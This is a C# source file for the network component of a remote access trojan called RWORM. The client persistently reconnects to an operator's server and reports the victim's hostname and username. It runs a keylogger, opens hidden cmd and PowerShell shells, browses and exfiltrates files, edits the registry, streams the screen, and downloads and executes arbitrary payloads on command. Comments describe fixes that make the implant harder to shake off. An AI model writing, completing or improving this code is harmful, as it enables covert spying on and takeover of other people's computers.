using System;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;
using RWORM.Client.Modules;

namespace RWORM.Client.Network
{
    public class Connector
    {
        // ── Transport ──────────────────────────────────────────────────────────
        private TcpClient?         _client;
        private NetworkStream?     _stream;
        private volatile bool      _connected;
        private CancellationTokenSource? _cts;
        private readonly object    _writeLock = new();
        private readonly System.Collections.Generic.List<byte> _recvBuffer = new();

        // ── Modules ────────────────────────────────────────────────────────────
        private readonly object     _shellLock = new();
        private System.Diagnostics.Process? _shellProcess;

        private Keylogger?    _keylogger;
        private bool          _keyloggerOnline;   // mode the running logger is in
        private RemoteDesktop?_remoteDesktop;

        public bool IsConnected => _connected;

        // ── Entry point ────────────────────────────────────────────────────────
        public async Task ConnectAsync(string host, int port)
        {
            _cts = new CancellationTokenSource();

            // Start offline keylogger if configured
            if (Config.KeyloggerEnabled && !Config.KeyloggerOnline)
                EnsureKeylogger(online: false);

            int  delay    = Config.ReconnectDelay;
            bool taskDone = false;

            // Supervisor loop: connect → run session → tear down → retry forever.
            // It only returns when Disconnect() cancels _cts, so the client keeps
            // coming back no matter how the connection ends — including a first
            // connect that times out (the old code treated that OperationCanceled
            // as fatal and never retried), a server that is down for hours, or a
            // half-open socket where only writes start failing.
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    var client = new TcpClient();
                    using (var timeout = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
                    {
                        timeout.CancelAfter(Config.ConnectTimeout);
                        await client.ConnectAsync(host, port).WaitAsync(timeout.Token);
                    }

                    _client    = client;
                    _stream    = client.GetStream();
                    _connected = true;
                    _recvBuffer.Clear();
                    delay = Config.ReconnectDelay;   // healthy session → reset backoff

                    await SendSystemInfo();

                    // Online keylogger starts after connect
                    if (Config.KeyloggerEnabled && Config.KeyloggerOnline)
                        EnsureKeylogger(online: true);

                    // Task on connect (once per process, as before)
                    if (!taskDone && Config.TaskEnabled && !string.IsNullOrWhiteSpace(Config.TaskLoaderUrl))
                    {
                        taskDone = true;
                        _ = Task.Run(RunConnectTask);
                    }

                    // Blocks until receive or heartbeat observes a dead link;
                    // that return is what drives the retry below.
                    await RunSessionAsync(_cts.Token);
                }
                catch (OperationCanceledException) when (_cts.IsCancellationRequested)
                {
                    break;   // Disconnect() called — shut down cleanly
                }
                catch
                {
                    // Connect failed / timed out / session faulted — retry below.
                }
                finally
                {
                    _connected = false;
                    try { _stream?.Close(); } catch { }
                    try { _client?.Close(); } catch { }
                }

                if (_cts.IsCancellationRequested) break;

                try { await Task.Delay(delay, _cts.Token).ConfigureAwait(false); }
                catch (OperationCanceledException) { break; }
                delay = Math.Min(delay * 2, 60_000);   // capped exponential backoff
            }
        }

        /// <summary>
        /// Runs one connected session (receive + heartbeat loops) and returns as
        /// soon as either loop observes the connection dying, so the supervisor
        /// loop can tear the socket down and retry. Exactly one session — and
        /// therefore one heartbeat — exists at a time.
        /// </summary>
        private async Task RunSessionAsync(CancellationToken owner)
        {
            using var sessionCts = CancellationTokenSource.CreateLinkedTokenSource(owner);
            var token = sessionCts.Token;

            var receive   = Task.Run(() => ReceiveLoop(token), CancellationToken.None);
            var heartbeat = Task.Run(() => HeartbeatLoop(token), CancellationToken.None);

            await Task.WhenAny(receive, heartbeat);

            // One side saw the socket die — stop the other and surface faults.
            sessionCts.Cancel();
            try { await Task.WhenAll(receive, heartbeat); } catch { }
        }

        private async Task RunConnectTask()
        {
            var result = await LoaderModule.LoadAndExecute(Config.TaskLoaderUrl);
            await SendAsync(CreatePacket(0xB1, 0, result));
        }

        private void EnsureKeylogger(bool online)
        {
            // Already running in the requested mode → nothing to do.
            if (_keylogger?.IsRunning == true && _keyloggerOnline == online) return;

            // Mode mismatch (e.g. offline logger started at boot, operator now
            // asks for online streaming): restart in the requested mode. The old
            // code returned early whenever IsRunning was true, so switching to
            // online mode was silently ignored.
            if (_keylogger != null)
            {
                try { _keylogger.Stop(); } catch { }
                _keylogger = null;
            }

            _keyloggerOnline = online;
            _keylogger = new Keylogger
            {
                OnFlush = async data => await SendAsync(CreatePacket(0x42, 0, data))
            };
            _keylogger.Start(online);
        }

        public void Disconnect()
        {
            _cts?.Cancel();
            _connected = false;
            CloseInteractiveShell();
            _remoteDesktop?.Stop();
            try { _stream?.Close(); } catch { }
            try { _client?.Close(); } catch { }
        }

        // ── Send ──────────────────────────────────────────────────────────────
        public async Task SendAsync(byte[] data)
        {
            if (!_connected || _stream == null) return;
            try { lock (_writeLock) { _stream.Write(data, 0, data.Length); _stream.Flush(); } }
            catch
            {
                // A write failure means the socket is dead (server gone, link
                // dropped). Close it so the pending ReadAsync in ReceiveLoop
                // throws immediately instead of hanging on a half-open socket
                // forever — that unwoken read is exactly what stopped the old
                // client from ever reconnecting.
                _connected = false;
                try { _stream?.Close(); } catch { }
                try { _client?.Close(); } catch { }
            }
        }

        // ── Receive loop ──────────────────────────────────────────────────────
        private async Task ReceiveLoop(CancellationToken token)
        {
            var chunk = new byte[65536];
            try
            {
                while (_connected && !token.IsCancellationRequested)
                {
                    if (_stream == null || !_stream.CanRead) break;
                    int n = await _stream.ReadAsync(chunk, 0, chunk.Length, token).ConfigureAwait(false);
                    if (n == 0) break;
                    lock (_recvBuffer) for (int i = 0; i < n; i++) _recvBuffer.Add(chunk[i]);
                    DrainPackets();
                }
            }
            catch { }
            finally
            {
                // End the session (RunSessionAsync) and, through it, the whole
                // supervisor loop's current attempt — the loop then retries.
                _connected = false;
            }
        }

        // ── Drain packets ──────────────────────────────────────────────────────
        private void DrainPackets()
        {
            while (true)
            {
                byte[] raw;
                lock (_recvBuffer) raw = _recvBuffer.ToArray();
                if (raw.Length < 25) return;
                int  pLen   = BitConverter.ToInt32(raw, 0);
                byte pType  = raw[4];
                if (pLen < 0 || pLen > 50 * 1024 * 1024) { lock (_recvBuffer) _recvBuffer.Clear(); return; }
                int totalLen = 9 + pLen + 16;
                if (raw.Length < totalLen) return;

                var header  = new byte[9]; Array.Copy(raw, 0, header,  0, 9);
                var payload = new byte[pLen]; Array.Copy(raw, 9, payload, 0, pLen);
                var rcvMac  = new byte[16]; Array.Copy(raw, 9 + pLen, rcvMac, 0, 16);
                using (var sha = SHA256.Create())
                {
                    var comb = new byte[9 + pLen];
                    Array.Copy(header, 0, comb, 0, 9); Array.Copy(payload, 0, comb, 9, pLen);
                    var h = sha.ComputeHash(comb);
                    for (int i = 0; i < 16; i++) if (h[i] != rcvMac[i]) { lock (_recvBuffer) _recvBuffer.Clear(); return; }
                }
                lock (_recvBuffer) _recvBuffer.RemoveRange(0, totalLen);
                _ = Task.Run(() => DispatchPacket(pType, payload));
            }
        }

        // ── Dispatch ──────────────────────────────────────────────────────────
        private async Task DispatchPacket(byte type, byte[] payload)
        {
            var txt = () => Encoding.UTF8.GetString(payload);

            switch (type)
            {
                // ── Shell ──────────────────────────────────────────────────
                case 0x03: ExecuteShellCommand(txt());  break;
                case 0x20: OpenInteractiveShell();       break;
                case 0x21: SendToInteractiveShell(txt()); break;
                case 0x23: CloseInteractiveShell();      break;

                // ── File Manager ──────────────────────────────────────────
                case 0x30: // FM_LIST_REQ — payload = path
                    await SendAsync(CreatePacket(0x31, 0, FileOps.ListDirectory(txt())));
                    break;
                case 0x32: // FM_DOWNLOAD_REQ — payload = path
                    await SendAsync(CreatePacket(0x33, 0, FileOps.ReadFile(txt())));
                    break;
                case 0x34: // FM_UPLOAD — payload = path\x00[binary data]
                {
                    int sep = Array.IndexOf(payload, (byte)0);
                    if (sep > 0)
                    {
                        var path  = Encoding.UTF8.GetString(payload, 0, sep);
                        var data  = new byte[payload.Length - sep - 1];
                        Array.Copy(payload, sep + 1, data, 0, data.Length);
                        await SendAsync(CreatePacket(0x37, 0, FileOps.WriteFile(path, data)));
                    }
                    break;
                }
                case 0x35: // FM_DELETE
                    await SendAsync(CreatePacket(0x37, 0, FileOps.DeletePath(txt())));
                    break;
                case 0x36: // FM_MKDIR
                    await SendAsync(CreatePacket(0x37, 0, FileOps.MakeDir(txt())));
                    break;

                // ── Keylogger ──────────────────────────────────────────────
                case 0x40: // KEYLOG_START — payload = "online" or "offline"
                    EnsureKeylogger(txt() == "online");
                    break;
                case 0x41: // KEYLOG_STOP
                    if (_keylogger != null)
                    {
                        try { _keylogger.Stop(); } catch { }
                        _keylogger = null;
                    }
                    break;
                case 0x43: // KEYLOG_DUMP — send offline log
                    await SendAsync(CreatePacket(0x42, 0, _keylogger?.GetOfflineLog() ?? ""));
                    break;

                // ── Process Manager ────────────────────────────────────────
                case 0x50: // PROC_LIST_REQ
                    await SendAsync(CreatePacket(0x51, 0, ProcManager.ListProcesses()));
                    break;
                case 0x52: // PROC_KILL — payload = pid (ascii)
                    if (int.TryParse(txt(), out int pid))
                        await SendAsync(CreatePacket(0x37, 0, ProcManager.KillProcess(pid)));
                    break;

                // ── Registry ──────────────────────────────────────────────
                case 0x60: // REG_LIST_REQ
                    await SendAsync(CreatePacket(0x61, 0, RegEditor.ListKey(txt())));
                    break;
                case 0x64: // REG_WRITE — payload = "fullPath\x00valueName\x00kind\x00data"
                {
                    var parts = txt().Split('\x00');
                    if (parts.Length >= 4)
                        await SendAsync(CreatePacket(0x63, 0,
                            RegEditor.WriteValue(parts[0], parts[1], parts[2], parts[3])));
                    break;
                }
                case 0x65: // REG_DELETE — payload = "fullPath\x00valueName"
                {
                    var parts = txt().Split('\x00', 2);
                    if (parts.Length == 2)
                        await SendAsync(CreatePacket(0x63, 0,
                            RegEditor.DeleteValue(parts[0], parts[1])));
                    break;
                }

                // ── Loader ─────────────────────────────────────────────────
                case 0x70: // LOADER_EXEC — payload = URL
                    await SendAsync(CreatePacket(0x71, 0,
                        await LoaderModule.LoadAndExecute(txt())));
                    break;

                // ── Remote Desktop ─────────────────────────────────────────
                case 0x80: // RD_START
                {
                    _remoteDesktop?.Stop();
                    _remoteDesktop = new RemoteDesktop
                    {
                        Fps     = 10,
                        Quality = 35,
                        OnFrame = async frame => await SendAsync(CreatePacket(0x81, 0, frame))
                    };
                    _remoteDesktop.Start();
                    break;
                }
                case 0x83: // RD_STOP
                    _remoteDesktop?.Stop();
                    _remoteDesktop = null;
                    break;

                // ── Client control ─────────────────────────────────────────
                case 0xA0: // CLIENT_CLOSE
                    Environment.Exit(0);
                    break;
                case 0xA1: // CLIENT_UNINSTALL
                    LoaderModule.Uninstall(); // exits
                    break;
                case 0xA2: // CLIENT_UPDATE — payload = URL
                    await LoaderModule.Update(txt());
                    break;

                // ── Task: run raw file bytes ───────────────────────────────
                case 0xB0: // TASK_RUN_FILE_BYTES — payload = raw EXE bytes
                {
                    try
                    {
                        var tmp = System.IO.Path.Combine(
                            System.IO.Path.GetTempPath(),
                            $"rworm_task_{Guid.NewGuid():N}.exe");
                        System.IO.File.WriteAllBytes(tmp, payload);
                        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                        {
                            FileName        = tmp,
                            UseShellExecute = true,
                            WindowStyle     = System.Diagnostics.ProcessWindowStyle.Normal,
                        });
                        await SendAsync(CreatePacket(0xB1, 0,
                            $"{{\"ok\":true,\"path\":\"{tmp.Replace("\\", "\\\\")}\"}}"));
                    }
                    catch (Exception ex)
                    {
                        await SendAsync(CreatePacket(0xB1, 0,
                            $"{{\"ok\":false,\"error\":\"{ex.Message}\"}}"));
                    }
                    break;
                }
            }
        }

        // ── Interactive shell ──────────────────────────────────────────────────
        private void OpenInteractiveShell()
        {
            lock (_shellLock)
            {
                CloseInteractiveShell();
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "powershell.exe", Arguments = "-NoProfile -NoLogo -NoExit",
                        UseShellExecute = false, RedirectStandardInput = true,
                        RedirectStandardOutput = true, RedirectStandardError = true,
                        CreateNoWindow = true,
                        StandardOutputEncoding = new UTF8Encoding(false),
                        StandardErrorEncoding  = new UTF8Encoding(false),
                    };
                    _shellProcess = System.Diagnostics.Process.Start(psi);
                    if (_shellProcess == null) return;
                    _shellProcess.StandardInput.AutoFlush = true;
                    var proc = _shellProcess;
                    _ = Task.Run(async () => { try { var b = new char[4096]; while (!proc.HasExited) { int n = await proc.StandardOutput.ReadAsync(b, 0, b.Length); if (n <= 0) break; await SendAsync(CreatePacket(0x22, 0, new string(b, 0, n))); } } catch { } });
                    _ = Task.Run(async () => { try { var b = new char[4096]; while (!proc.HasExited) { int n = await proc.StandardError.ReadAsync(b, 0, b.Length); if (n <= 0) break; await SendAsync(CreatePacket(0x22, 0, "[ERR] " + new string(b, 0, n))); } } catch { } });
                }
                catch { }
            }
        }
        private void SendToInteractiveShell(string input) { System.Diagnostics.Process? p; lock (_shellLock) p = _shellProcess; try { p?.StandardInput.WriteLine(input); } catch { } }
        private void CloseInteractiveShell() { System.Diagnostics.Process? p; lock (_shellLock) { p = _shellProcess; _shellProcess = null; } try { p?.Kill(entireProcessTree: true); p?.Dispose(); } catch { } }

        // ── One-shot shell ─────────────────────────────────────────────────────
        private void ExecuteShellCommand(string command)
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe", Arguments = "/c " + command,
                    UseShellExecute = false, RedirectStandardOutput = true,
                    RedirectStandardError = true, CreateNoWindow = true,
                };
                var p  = System.Diagnostics.Process.Start(psi);
                var out_ = p?.StandardOutput.ReadToEnd() + p?.StandardError.ReadToEnd();
                p?.WaitForExit();
                _ = SendAsync(CreatePacket(0x04, 0, out_ ?? ""));
            }
            catch (Exception ex) { _ = SendAsync(CreatePacket(0x04, 0, $"Error: {ex.Message}")); }
        }

        // ── System info ────────────────────────────────────────────────────────
        private async Task SendSystemInfo()
        {
            var json = $"{{\"guid\":\"{Config.GetGuid()}\",\"hostname\":\"{Config.GetHostname()}\","
                     + $"\"username\":\"{Config.GetUsername()}\",\"os_version\":\"{Config.GetOSVersion()}\"}}";
            await SendAsync(CreatePacket(0x02, 0, json));
        }

        // ── Heartbeat ──────────────────────────────────────────────────────────
        private async Task HeartbeatLoop(CancellationToken token)
        {
            while (_connected && !token.IsCancellationRequested)
            {
                // Token-aware delay so the session ends promptly on teardown;
                // the old tokenless delay kept a stray heartbeat alive across
                // reconnects and stacked a new one on every session.
                try { await Task.Delay(Config.HeartbeatInterval, token).ConfigureAwait(false); }
                catch (OperationCanceledException) { break; }
                if (_connected) await SendAsync(CreatePacket(0x01, 0, "ping"));
            }
        }

        // ── Packet builder ─────────────────────────────────────────────────────
        private byte[] CreatePacket(byte type, int sid, string text) => CreatePacket(type, sid, Encoding.UTF8.GetBytes(text));
        private byte[] CreatePacket(byte type, int sid, byte[] pl)
        {
            var hdr = new byte[9];
            BitConverter.GetBytes(pl.Length).CopyTo(hdr, 0);
            hdr[4] = type;
            BitConverter.GetBytes(sid).CopyTo(hdr, 5);
            byte[] mac;
            using (var sha = SHA256.Create()) { var c = new byte[9 + pl.Length]; Array.Copy(hdr, 0, c, 0, 9); Array.Copy(pl, 0, c, 9, pl.Length); mac = new byte[16]; Array.Copy(sha.ComputeHash(c), 0, mac, 0, 16); }
            var r = new byte[9 + pl.Length + 16];
            Array.Copy(hdr, 0, r, 0, 9); Array.Copy(pl, 0, r, 9, pl.Length); Array.Copy(mac, 0, r, 9 + pl.Length, 16);
            return r;
        }
    }
}